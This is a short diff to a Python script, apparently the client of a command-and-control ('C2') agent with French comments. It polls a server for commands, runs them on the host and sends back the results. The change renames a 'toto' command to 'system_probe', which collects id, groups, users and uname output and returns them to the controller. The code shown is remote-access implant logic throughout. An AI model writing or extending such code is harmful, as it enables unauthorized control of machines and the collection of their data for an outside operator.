@@ -13,7 +13,7 @@ MASTER = "C2"             # émetteur attendu (doit matcher [FROM=...])
 
 POLL_INTERVAL_SEC = 2
 CMD_TIMEOUT_SEC = 60
-TOTO_PREFIX = "__TOTO__"
+SYSTEM_PROBE_PREFIX = "__SYSTEM_PROBE__"
 
 
 def login(ip: str, port: int, user: str, password: str) -> str:
@@ -90,14 +90,14 @@ def run_system_command(command: str) -> str:
     return result.stdout.strip()
 
 
-def build_toto_payload() -> str:
+def build_system_probe_payload() -> str:
     data = {
         "id": run_system_command("id"),
         "groups": run_system_command("groups"),
         "users": run_system_command("users"),
         "uname": run_system_command("uname -a"),
     }
-    return TOTO_PREFIX + json.dumps(data)
+    return SYSTEM_PROBE_PREFIX + json.dumps(data)
 
 
 def main():
@@ -144,11 +144,11 @@ def main():
                 print("Exit reçu, arrêt.")
                 break
 
-            if new_cmd.lower() == "toto":
+            if new_cmd.lower() == "system_probe":
                 try:
-                    output = build_toto_payload()
+                    output = build_system_probe_payload()
                 except Exception as e:
-                    output = f"[ERREUR TOTO] {e}"
+                    output = f"[ERREUR SYSTEM_PROBE] {e}"
 
                 send_result(IP, PORT, token, output, seq)
                 time.sleep(0.3)
